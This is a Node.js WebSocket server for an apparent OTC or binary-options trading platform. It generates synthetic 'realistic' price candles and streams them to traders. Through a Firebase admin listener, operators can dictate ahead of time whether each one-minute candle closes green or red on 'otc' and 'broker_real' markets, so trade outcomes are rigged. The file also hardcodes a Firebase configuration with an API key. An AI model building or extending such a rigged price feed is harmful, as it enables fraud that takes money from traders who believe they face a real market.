// --- START: server.js (v21 - Full Admin Control Integration) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; // Server's internal market data
const adminPatterns = {}; // Local cache for admin patterns

// Helper functions
function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Admin Control Listener ---
// This continuously listens for admin commands from Firebase
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        if (fbMarkets[marketId]?.pattern_config?.isActive) {
            adminPatterns[marketId] = fbMarkets[marketId].pattern_config;
        } else {
            delete adminPatterns[marketId]; // Remove if not active
        }
    });
});

// Candle Generation Logic
function generateHistoricalCandle(timestamp, open) {
  const safeOpen = Math.max(MIN_PRICE, open);
  const isGreen = Math.random() > 0.5;
  const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
  const close = isGreen ? safeOpen + body : safeOpen - body;
  const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
  const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

  return {
    timestamp,
    open: roundPrice(safeOpen),
    high: roundPrice(Math.max(safeOpen, close) + upperWick),
    low: roundPrice(Math.min(safeOpen, close) - lowerWick),
    close: roundPrice(close)
  };
}

// Admin-Controlled Candle Generation
function generateAdminCandle(timestamp, open, adminColor) {
    const bodySize = open * (0.0001 + Math.random() * 0.0001); // Standard body size
    const upperWick = open * (Math.random() * 0.00008);
    const lowerWick = open * (Math.random() * 0.00008);

    let close;
    if (adminColor === 'GREEN') {
        close = open + bodySize;
    } else { // RED
        close = open - bodySize;
    }
    
    return {
        timestamp,
        open: roundPrice(open),
        high: roundPrice(Math.max(open, close) + upperWick),
        low: roundPrice(Math.min(open, close) - lowerWick),
        close: roundPrice(close)
    };
}

async function initializeNewMarket(marketId) {
  const path = marketPathFromId(marketId);
  let startPrice = 1.15;

  try {
    const liveSnap = await db.ref(`markets/${path}/live`).once('value');
    if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
  } catch (e) {}

  const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
  const candles = [];
  let currentPrice = startPrice;

  for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
    const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
    candles.push(c);
    currentPrice = c.close;
  }

  markets[marketId] = {
    marketId,
    marketPath: path,
    history: candles,
    currentPrice: currentPrice,
    lastMove: 0
  };
}

// 🔥 Core Function: Checks for admin command before creating a new candle
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
  let lastCandle = marketData.history[marketData.history.length - 1];
  if (!lastCandle) return null;

  if (currentPeriod > lastCandle.timestamp) {
    let newCandle;
    const adminPattern = adminPatterns[marketData.marketId];

    // Check if an admin pattern is active for this new candle
    if (adminPattern && currentPeriod >= adminPattern.startTime) {
        const patternIndex = Math.floor((currentPeriod - adminPattern.startTime) / TIMEFRAME);
        if (patternIndex >= 0 && patternIndex < adminPattern.pattern.length) {
            const adminColor = adminPattern.pattern[patternIndex];
            newCandle = generateAdminCandle(currentPeriod, lastCandle.close, adminColor);
            console.log(`[ADMIN] Market: ${marketData.marketId}, Time: ${new Date(currentPeriod).toLocaleTimeString()}, Set to: ${adminColor}`);
        }
    }
    
    // If no admin command, generate a normal historical candle
    if (!newCandle) {
        newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close);
    }

    marketData.history.push(newCandle);
    if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
    return newCandle;
  }
  return lastCandle;
}

// Realistic Tick Movement (same as before)
function updateRealisticPrice(marketData, candle) {
  if (Math.random() < 0.35) return; 

  const openPrice = candle.open;
  const baseVolatility = openPrice * 0.00005;

  let impulse = (Math.random() - 0.5) * baseVolatility * 2.5;
  let recoil = -marketData.lastMove * 0.3; 
  let jitter = (Math.random() - 0.5) * (baseVolatility * 0.2);
  let finalMove = impulse + recoil + jitter;
  
  if (Math.random() < 0.1) finalMove *= 4;

  marketData.currentPrice += finalMove;
  marketData.lastMove = finalMove;

  const dist = marketData.currentPrice - openPrice;
  if (Math.abs(dist) > openPrice * 0.001) marketData.currentPrice -= finalMove * 1.5;

  candle.close = roundPrice(marketData.currentPrice);
  candle.high = roundPrice(Math.max(candle.high, candle.close));
  candle.low = roundPrice(Math.min(candle.low, candle.close));
}

function broadcastCandle(marketId, candle) {
  const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
      client.send(payload);
    }
  });
}

// Market listener
db.ref('admin/markets').on('value', (snapshot) => {
  const fbMarkets = snapshot.val() || {};
  Object.keys(fbMarkets).forEach((marketId) => {
    const type = fbMarkets[marketId]?.type;
    // Only initialize controllable markets
    if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
      initializeNewMarket(marketId);
    }
  });
});

wss.on('connection', (ws) => {
  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      if (msg?.type === 'subscribe') {
        ws.subscribedMarket = msg.market;
        // Send history on subscribe
        if (markets[msg.market]) {
            const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
            ws.send(JSON.stringify(historyPayload));
        }
      }
    } catch (_) {}
  });
});

// App endpoint to serve history for admin panel
app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found or not initialized' });
    }
});

// Main Loop
let lastSyncMinute = 0;
setInterval(() => {
  const now = Date.now();
  const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
  const currentMinute = Math.floor(now / 60000);

  for (const marketId in markets) {
    const marketData = markets[marketId];
    let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
    if (!candle) continue;

    updateRealisticPrice(marketData, candle);
    broadcastCandle(marketId, candle);
  }

  if (currentMinute > lastSyncMinute) {
    lastSyncMinute = currentMinute;
    const batchUpdates = {};
    for (const marketId in markets) {
      const m = markets[marketId];
      const lastC = m.history[m.history.length-1];
      if (lastC) {
        batchUpdates[`markets/${m.marketPath}/live`] = {
          price: lastC.close,
          timestamp: lastC.timestamp
        };
      }
    }
    db.ref().update(batchUpdates).catch(()=>{});
    console.log(`[Batch Sync] ${Object.keys(markets).length} markets backed up.`);
  }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('UltraSmooth V21 - Full Admin Control Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---